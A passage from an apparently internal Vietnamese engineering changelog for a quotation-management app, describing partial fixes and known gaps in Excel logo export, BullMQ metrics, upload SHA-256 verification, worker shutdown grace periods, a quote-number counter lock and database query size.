`data:image/webp`, còn `insertCustomerLogo` (`src/excel.ts`) chỉ nhúng được
png/jpeg/gif. Đợt này **chỉ vá phần tệ nhất**: ô C3 nay được xoá trước khi hàm
`return`, nên file gửi khách không còn in dòng hướng dẫn "logo cty khách hàng"
(`tests/xp3-excel-cells.test.js`). **Logo vẫn biến mất**, chỉ là mất im lặng vào
một ô trống thay vì thành chữ sai.

Cố ý **không** gỡ `webp` khỏi validator: người dùng có thể đã lưu logo webp, và
lưới hạng mục (`web/src/components/GridTable.tsx:89`) cũng nhận webp — siết
validator sẽ làm **hỏng nút Lưu** của những báo giá đó, tệ hơn hẳn một logo thiếu.

**Chưa kiểm chứng:** ExcelJS ghi content-type `image/webp` một cách máy móc
(`node_modules/exceljs/.../content-types-xform.js:19`), nhưng chưa mở thử bằng
Excel thật nên **không biết** bản Excel nào của khách đọc được. Vì thế không nhúng
thẳng webp. **Việc nên làm:** tái mã hoá logo sang JPEG ngay ở client
(`NewQuoteWizard.tsx`), đúng cách `GridTable.tsx` đang làm cho ảnh hạng mục.

## Số liệu hàng đợi BullMQ: CHƯA có ai scrape ở production

`/metrics` nay có gauge `bullmq_jobs{queue,state}` (đọc `getJobCounts()` của cả 5
hàng đợi ngay tại thời điểm scrape — `src/queue.ts` `capNhatDoSauHangDoi`). Đã đo
được qua Redis cục bộ trong `tests/hq3-bullmq-metrics.test.js`.

**Chưa kiểm chứng ở production, và còn thiếu hai mảnh:**

1. **Không có Prometheus nào đang chạy.** Production là docker-compose/Coolify;
   trong repo không có deployment Prometheus/Grafana. Bộ số này hiện chỉ đọc được
   bằng cách gọi tay `/metrics`. Cấu hình ServiceMonitor trong `infra/helm/` đã có
   token nhưng chart đó chưa được dùng.
2. **Tiến trình worker KHÔNG được scrape.** `src/worker.ts` không mở cổng HTTP nào,
   nên `export_jobs_total` mà nó tăng (`worker.ts:22/:25`) ghi vào một registry
   không ai đọc. Gauge `bullmq_jobs` không bị ảnh hưởng vì nó được đọc từ phía API,
   nhưng mọi số liệu SINH RA TRONG worker thì vẫn vô hình. Muốn có: mở một server
   `/metrics` riêng trong worker + thêm `ports:`/annotation `prometheus.io/*` vào
   `infra/helm/quanly/templates/worker-deployment.yaml` (hiện thiếu cả hai, khác với
   `app-deployment.yaml`).

## Băm SHA-256 của tệp tải lên đã được LƯU, nhưng CHƯA có ai đối chiếu

`UploadObject.sha256` (cột đã có sẵn trong schema từ lâu) nay được điền ở cả hai
đường ghi trong `src/routes/files.routes.ts`: multipart băm buffer vừa nhận, và
`/finalize` băm nội dung thật đọc từ kho object. Có test qua HTTP + MinIO thật
(`tests/hq3-upload-sha256.test.js`).

**Còn thiếu phía ĐỐI CHIẾU.** `src/tools/verifyIntegrity.ts` mới chỉ có `--pii` và
`--proof`; chưa có chế độ duyệt `UploadObject` đã `finalized` để so lại hash như
`paymentProofSha256` đang được so. Nghĩa là: từ nay có BẢN GHI để đối chiếu, nhưng
diễn tập khôi phục (`scripts/backup/restore-drill.sh`) vẫn chưa kiểm tệp đính kèm.
**Cố ý không làm ở đợt này** vì thêm một bước mới vào diễn tập hàng tuần mà không
chạy thử được trên dữ liệu production là cách dễ nhất để biến một diễn tập đang
xanh thành đỏ vì lý do sai. Hàng cũ (tải lên trước thay đổi này) có `sha256 = NULL`
và phải được coi là "không đối chiếu được", không phải "sai hash".

**Lưu ý về giá phải trả:** `/finalize` nay tải NGUYÊN nội dung object về (trước chỉ
tải với .xlsx) để băm — thêm một lượt GET tối đa 10 MB mỗi tệp, đúng một lần trong
đời tệp đó.

## Ân hạn dừng worker = 90s là số CHỌN, không phải số ĐO (cụm ha-tang-trienkhai)

`docker-compose.prod.yml` / `.staging.yml` nay khai `stop_grace_period: 90s` cho
service `worker`, và `infra/k8s/worker.yaml` + `values.yaml` khai
`terminationGracePeriodSeconds: 90`. Trước đó compose không khai gì — tức dùng
**mặc định 10s của Docker**, nhỏ hơn cả trần cứng 30s của riêng bước sinh file
trong một job xuất (`EXPORT_GEN_TIMEOUT_MS` ở `src/exportQueue.ts`, áp vào tiến trình worker qua
`sinhFileXuat` trong `src/worker.ts`).

**90 đến từ đâu:** 3× trần 30s đó, chừa chỗ cho tải lên kho object và ghi CSDL sau
khi file đã dựng xong. Đó là suy luận từ hằng số có thật trong mã, **không phải
phép đo**. Chưa ai bấm giờ một lượt `docker compose down` trên VM production để
xem worker thật sự cần bao lâu mới đóng hết job.

**Trần 30s đó trước đây KHÔNG áp cho worker — nay thì có.** Cho tới bản vá này
`src/worker.ts` không hề import `exportQueue.js`: processor `QUEUES.EXPORT` gọi
thẳng `buildQuoteBuffer`/`renderQuotePdf`, tức job xuất nền chạy **không có trần
thời gian nào cả**, và con số 90 neo vào một cái trần không nằm trên đường thực
thi của nó. Nay `sinhFileXuat` (src/worker.ts) đi qua
`runExportJob(..., { choPhepNoiTuyen: false })`, nên bước sinh file chạy trong
`worker_threads` và hết hạn là `terminate()` — **trần thật**, vì luồng bị giết chứ
không phải lời hứa bị bỏ mặc. Quá hạn ném `UnrecoverableError` để BullMQ hỏng ngay
với `failedReason` người dùng đọc được ở `GET /api/jobs/:queue/:id`, thay cho hành
vi cũ: chờ mãi, bị SIGKILL, rồi chết vĩnh viễn vì `maxStalledCount`.

**Vẫn còn là số CHỌN:** trần 30s (`EXPORT_GEN_TIMEOUT_MS`) chưa neo vào phân vị đo
được của `export_jobs_total`/`exportDuration`. Báo giá lớn hơn mức đó nay **hỏng
có thông báo** thay vì treo — tốt hơn, nhưng nếu p99 thật vượt 30s thì phải nâng
biến môi trường đó **và** nâng ân hạn dừng theo cùng tỉ lệ.

**Đã kiểm được tới đâu:** `docker compose config` (chạy phía client, không cần
daemon) parse cả hai file và chuẩn hoá đúng `90s → 1m30s` trên đúng service
`worker`; `kubeconform` xác nhận manifest hợp schema. Cả hai chỉ nói **khai báo
đúng hình dạng**, không nói hành vi lúc dừng.

**Việc phải làm:** một lần deploy có người canh, đo thời gian từ SIGTERM tới lúc
tiến trình worker thoát khi đang có job xuất chạy. Nếu vượt 90s thì nâng số; nếu
luôn dưới 20s thì hạ xuống cho lượt deploy nhanh lại. Ba chỗ phải đổi CÙNG NHAU —
`tests/ht3-k8s-drain-and-grace.test.js` đỏ nếu chúng lệch nhau.

**Đồng thời:** `infra/k8s/pdb.yaml` (PodDisruptionBudget) là file MỚI, **chưa từng
chạy trên cụm k8s nào**. Nó mới chỉ qua `kubeconform` — đúng hình dạng schema, chứ
không phải "đã thấy `kubectl drain` kết thúc". Đường triển khai thật vẫn là compose
(`deploy.sh`), nên toàn bộ nhánh k8s/Helm ở đây là bản tham chiếu chưa được xác minh.

## Khoá bộ đếm số báo giá giữ suốt transaction TẠO — CỐ Ý chưa vá (cụm csdl-truyvan)

`nextQuoteNumber` (`src/quoteNumber.ts`) upsert-increment hàng `QuoteCounter(prefix, year)` và nó
vẫn là LỆNH ĐẦU của transaction tạo báo giá (`src/services/quoteService.ts`, `createQuote` và
đường nhân bản). Postgres giữ khoá hàng đó tới COMMIT, tức suốt cả phần chèn sheet + hạng mục +
`snapshotQuoteVersion`. Hai người CÙNG công ty bấm "Tạo báo giá" chồng nhau thì người sau xếp hàng
sau người trước — vấn đề THÔNG LƯỢNG, không phải lỗi đúng-sai, và với đội vài chục người thì hiếm.

**Vì sao chưa vá.** Cách chữa gốc là tạo báo giá với số TẠM (`TMP-<uuid>`) rồi cấp số thật bằng
một UPDATE ở cuối transaction. Đổi như vậy đụng ba thứ trên đường ghi nóng nhất của hệ thống:
(1) thêm một lượt ghi Quote trong cùng transaction ⇒ extension realtime ở `src/db.ts` bắn HAI sự
kiện SSE cho một lần tạo (né được bằng `$executeRaw`, nhưng rồi);
(2) `$executeRaw` không cho ra `P2002` mà cho `P2010` kèm mã `23505` ⇒ vòng thử lại chống trùng số
phải đổi cách nhận diện lỗi;
(3) `searchText` chứa số báo giá nên phải cập nhật cùng lệnh đó.
Đổi lấy một cải thiện thông lượng chưa từng có ai báo là đang đau.

**Và chưa có phép đo nào không chập chờn.** Thứ duy nhất đo được là "hàng bộ đếm bị khoá bao lâu
so với độ dài transaction", đo bằng cách bắn `SELECT … FOR UPDATE NOWAIT` liên tục từ một kết nối
khác. Đó là bài test phụ thuộc thời gian — đúng loại làm CI đỏ ngẫu nhiên. Không viết một bài như
thế chỉ để có cho đủ.

**Phần ĐÃ vá trong đợt này** (có test đi kèm, `tests/db3-quote-manual-number-counter.test.js`):
số báo giá NHẬP TAY nay đẩy bộ đếm lên theo (`syncQuoteCounter`), và vòng thử lại khi đụng số
trùng nay THOÁT ra được — trước đó nó vô tác dụng vì lần tăng bộ đếm bị rollback cùng transaction
hỏng, nên bốn lượt thử đều sinh lại đúng một số.

## Truy vấn `existing` khi LƯU báo giá vẫn kéo toàn bộ hạng mục + ảnh (cụm csdl-truyvan)

`updateQuote` (`src/services/quoteService.ts`) mở đầu bằng `findFirst({ include: QUOTE_INCLUDE })`,
tức đọc mọi sheet, mọi hạng mục và cả cột `images` (base64) — trong khi phần lớn chỉ dùng vài
trường phẳng. `tx.quote.update` bên trong transaction cũng `include: QUOTE_INCLUDE` để trả về client.

**Chưa thu hẹp** vì `existing` được dùng rải rác (quyền sửa, khoá lạc quan, `hnStatus`, nhánh tính
lại tổng từ `existing.sheets`, audit trước/sau, thông báo). Một `select` hẹp bỏ sót một trường sẽ
thành `undefined` LẶNG LẼ ở production chứ không phải lỗi biên dịch — cái giá của việc sai lớn hơn
nhiều so với phần đọc tiết kiệm được. Nếu làm thì phải làm kèm bài test đi qua đủ các nhánh dùng
`existing`, không phải sửa một dòng.

**Phần ĐÃ vá:** lần đọc thứ BA — `snapshotQuoteVersion` (`src/quoteVersion.ts`) — nay có `select`
liệt kê đúng 13 trường payload dùng, nên không còn giải TOAST ảnh base64 bên trong transaction lưu.
Đo được bằng `pg_statio_all_tables`: 612 block TOAST → 0 (`tests/db3-snapshot-no-images.test.js`).
